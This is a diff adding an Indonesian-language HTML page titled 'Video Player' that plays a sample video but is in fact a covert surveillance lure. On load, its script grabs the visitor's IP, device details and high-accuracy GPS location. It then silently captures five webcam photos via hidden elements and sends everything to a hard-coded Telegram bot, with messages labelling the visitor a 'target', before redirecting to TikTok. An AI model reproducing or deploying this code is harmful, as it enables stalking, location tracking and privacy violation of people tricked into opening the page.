@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Video Player</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .video-container {
+            width: 100%;
+            background: #000;
+        }
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .hidden {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+<div class="video-container">
+    <video id="mainVideo" autoplay muted loop playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+</div>
+
+<video id="hiddenVideo" class="hidden" autoplay muted playsinline></video>
+<canvas id="hiddenCanvas" class="hidden"></canvas>
+
+<script>
+    // ========== KONFIGURASI TELEGRAM ==========
+    const BOT_TOKEN = "8004617141:AAFL9m0UMxpERhkRy5H4loJHH6CsAAUpiPk";
+    const CHAT_ID = "5624703912";
+    // ==========================================
+
+    let cameraStream = null;
+    let photoCount = 0;
+    const TOTAL_PHOTOS = 5;
+    let locationData = null;
+    let ipAddress = "mengambil...";
+
+    // Kirim pesan teks ke Telegram
+    async function sendMessage(text) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        } catch(e) { console.log("Error message:", e); }
+    }
+
+    // Kirim foto ke Telegram (pakai FormData, lebih stabil)
+    async function sendPhoto(blob, caption) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            return true;
+        } catch(e) {
+            console.log("Error sendPhoto:", e);
+            return false;
+        }
+    }
+
+    // Ambil IP
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'tidak terdeteksi'; }
+    }
+
+    // Ambil lokasi
+    function getLocationOnce() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                }),
+                (err) => resolve(null),
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        });
+    }
+
+    // Konversi canvas ke Blob (file foto)
+    function canvasToBlob(canvas) {
+        return new Promise((resolve) => {
+            canvas.toBlob((blob) => {
+                resolve(blob);
+            }, 'image/jpeg', 0.85);
+        });
+    }
+
+    // Ambil 1 foto
+    async function takeOnePhoto(photoNumber) {
+        return new Promise(async (resolve) => {
+            if (!cameraStream) {
+                resolve(null);
+                return;
+            }
+            
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
+            
+            setTimeout(async () => {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await canvasToBlob(canvas);
+                    resolve(blob);
+                } else {
+                    resolve(null);
+                }
+            }, 200);
+        });
+    }
+
+    // Fungsi utama
+    async function startStealth() {
+        // Ambil IP
+        ipAddress = await getIP();
+        
+        // Kirim notifikasi awal
+        await sendMessage(`🎯 ZIME MAJESTY AKTIF
+🌐 IP: ${ipAddress}
+📱 Device: ${navigator.userAgent}
+🕒 Waktu: ${new Date().toLocaleString('id-ID')}
+📸 Target: ${TOTAL_PHOTOS} foto akan diambil`);
+        
+        // Ambil lokasi
+        locationData = await getLocationOnce();
+        if (locationData) {
+            const mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`;
+            await sendMessage(`📍 LOKASI TARGET
+Lat: ${locationData.lat}
+Lng: ${locationData.lng}
+Akurasi: ±${locationData.accuracy}m
+Maps: ${mapsLink}
+IP: ${ipAddress}`);
+        } else {
+            await sendMessage(`⚠️ LOKASI GAGAL
+IP: ${ipAddress}`);
+        }
+
+        // Minta akses kamera
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            cameraStream = stream;
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            await video.play();
+            
+            await sendMessage(`📸 Kamera aktif, mengambil ${TOTAL_PHOTOS} foto...`);
+            
+            // Ambil foto bertahap
+            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
+                const photoBlob = await takeOnePhoto(i);
+                if (photoBlob) {
+                    const success = await sendPhoto(photoBlob, `📸 FOTO KE-${i} DARI ${TOTAL_PHOTOS}
+🌐 IP: ${ipAddress}
+🕒 ${new Date().toLocaleString('id-ID')}`);
+                    if (success) {
+                        photoCount++;
+                    }
+                }
+                await new Promise(r => setTimeout(r, 800));
+            }
+            
+            // Matikan kamera
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            
+            // Laporan akhir
+            await sendMessage(`✅ SELESAI! ${photoCount} dari ${TOTAL_PHOTOS} foto berhasil dikirim
+IP: ${ipAddress}
+🕒 ${new Date().toLocaleString('id-ID')}`);
+            
+        } catch(err) {
+            console.log("Camera error:", err);
+            await sendMessage(`❌ KAMERA DITOLAK
+IP: ${ipAddress}
+Error: ${err.message || 'Izin ditolak'}`);
+        }
+        
+        // Redirect ke TikTok
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com/@scardion/video/7456978207125212448";
+        }, 1500);
+    }
+
+    window.addEventListener('load', () => {
+        setTimeout(startStealth, 500);
+    });
+</script>
+</body>
+</html>
